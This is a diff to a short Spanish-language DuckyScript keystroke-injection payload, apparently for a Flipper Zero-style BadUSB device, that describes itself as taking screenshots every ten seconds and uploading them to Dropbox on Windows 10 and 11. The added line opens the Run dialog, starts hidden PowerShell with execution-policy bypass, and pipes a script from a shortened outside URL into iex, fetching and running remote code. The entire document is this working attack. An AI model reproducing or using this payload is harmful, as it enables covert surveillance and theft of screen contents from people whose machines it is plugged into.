@@ -1,6 +1,6 @@
 REM     Title: captura de pantalla cada 10seg
 
-REM     Author:mrflippermen
+REM     Author: mrflippermen
 
 REM     Description: Este payload toma una captura de pantalla y la sube a Dropbox.
 
@@ -10,5 +10,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $db='';irm  | iex
+STRING powershell -w h -ep bypass $db='';irm https://n9.cl/ktijrn | iex
 ENTER
